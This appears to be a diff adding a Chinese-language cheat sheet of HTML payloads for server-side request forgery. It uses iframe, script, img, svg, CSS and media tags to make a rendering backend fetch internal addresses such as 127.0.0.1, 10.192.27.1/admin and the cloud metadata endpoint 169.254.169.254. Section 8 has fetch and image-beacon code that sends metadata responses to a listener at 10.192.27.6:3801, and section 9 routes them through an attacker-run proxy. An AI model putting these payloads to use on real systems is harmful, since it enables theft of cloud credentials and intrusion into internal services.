@@ -1,0 +1,74 @@
+# SSRF 内容可视化测试（尝试将内网响应显示出来）
+
+## 1. 使用 iframe / object / embed（如果允许加载子资源）
+
+<iframe src="http://127.0.0.1:80" width="600" height="400"></iframe>
+
+<object data="http://169.254.169.254/latest/meta-data/" type="text/plain"></object>
+
+<embed src="http://10.192.27.1:8080/admin" width="100%" height="300">
+
+## 2. 使用 script 标签（JSONP 或纯文本回显，若允许跨域）
+
+<script src="http://127.0.0.1:80/"></script>
+
+<script>
+fetch('http://169.254.169.254/latest/meta-data/')
+  .then(r => r.text())
+  .then(t => document.body.innerHTML += '<pre>' + t + '</pre>');
+</script>
+
+## 3. 将文本内容作为图片的 alt / title（不会渲染，但鼠标悬停可能看到）
+
+<img src="http://127.0.0.1:80/etc/passwd" alt="ssrf响应内容将显示在此（如果后端将文本填入alt）" title="http://127.0.0.1:80">
+
+## 4. 利用 svg 子资源加载并显示文本（如果支持 SVG 渲染）
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <iframe src="http://169.254.169.254/latest/meta-data/" width="500" height="200"></iframe>
+    </div>
+  </foreignObject>
+</svg>
+
+## 5. 使用 link + 预加载 + 错误事件外带响应（盲转显）
+
+<link rel="prefetch" href="http://127.0.0.1:80/secret" onload="this.onload=function(){alert('资源已加载，长度:'+this.href)}">
+
+## 6. 通过 css 的 background-image 触发请求（不可见文本）
+
+<style>
+.div-ssrf {
+  width: 500px;
+  height: 200px;
+  background-image: url('http://169.254.169.254/latest/meta-data/');
+  background-repeat: no-repeat;
+}
+</style>
+<div class="div-ssrf"></div>
+
+## 7. 通过音频/视频标签请求资源（同样不可见文本，但可配合事件）
+
+<audio src="http://127.0.0.1:80/test.wav" autoplay controls></audio>
+<video src="http://10.192.27.1:8080/video.mp4" controls></video>
+
+## 8. 数据外带：将内网响应作为参数发送到你的监听服务器（盲转显核心方法）
+
+<img src="http://10.192.27.6:3801/log?data=http://169.254.169.254/latest/meta-data/">
+
+<script>
+fetch('http://169.254.169.254/latest/meta-data/')
+  .then(r => r.text())
+  .then(data => {
+    new Image().src = `http://10.192.27.6:3801/exfil?content=${encodeURIComponent(data)}`;
+  });
+</script>
+
+<!-- 简单版：使用 onerror 把请求过的 URL 发回去 -->
+<img src="http://127.0.0.1:80/admin" onerror="this.src='http://10.192.27.6:3801/error?url='+encodeURIComponent('http://127.0.0.1:80/admin')">
+
+## 9. 组合攻击：用你的服务器做代理，返回图片格式内容（需配合控制你的服务器）
+
+假设你的服务器 `10.192.27.6:3801` 可以接收参数 `?url=xxx`，然后请求该 URL 并将响应转换为图片（如截图或 base64 图片），则可直接渲染：
+<img src="http://10.192.27.6:3801/proxy?url=http://169.254.169.254/latest/meta-data/&fmt=png">
